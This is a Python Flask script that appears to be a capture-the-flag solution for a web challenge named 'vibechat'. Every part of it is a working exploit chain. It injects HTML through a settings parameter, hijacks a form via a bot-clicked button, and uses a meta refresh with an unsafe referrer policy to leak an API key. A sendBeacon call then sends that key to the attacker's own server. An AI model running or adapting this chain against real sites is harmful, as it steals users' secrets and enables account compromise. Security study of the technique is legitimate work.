from flask import Flask, request
import requests
import html
import time
import threading
from urllib.parse import quote
import sys

app = Flask(__name__)

TARGET = 'http://vibechat.challs.ctf.bhackari.it:3000'
WEBHOOK = 'http://sebsrt.online'
PAYLOAD = html.escape(f'<meta name="referrer" content="unsafe-url" /><meta http-equiv="refresh" content="0; url={WEBHOOK}">', True)
TRIGGER = f'<input form="api-form" name="settings" value="{PAYLOAD}"><button form="api-form" formmethod="get" id="btn" type="submit">clickme</button>'
PAGE = f'''
<script>
  if (!document.referrer.includes('api-key')) {{
    if (!location.search.includes('x')) {{
        open('/?x=1');
        location = 'http://localhost:3000/?settings={quote(TRIGGER)}';
    }} else {{
        setTimeout(() => {{ location = 'http://localhost:3000/?settings=opener.btn.click'; }}, 1000);
    }}
}} else {{
  navigator.sendBeacon('/flag', document.referrer.split('api-key=')[1])
}}
</script>
'''

@app.get('/')
def index():
    # print(request.headers.get('Referer'))
    return PAGE


@app.post('/flag')
def flag():
    print(request.data)
    return 'ok'

def call_bot():
    time.sleep(1)
    r = requests.get(TARGET+'/bot', params={'url': WEBHOOK})
    print(r.text)

if __name__ == '__main__':
    threading.Thread(target=call_bot).start()
    app.run(port=5000)
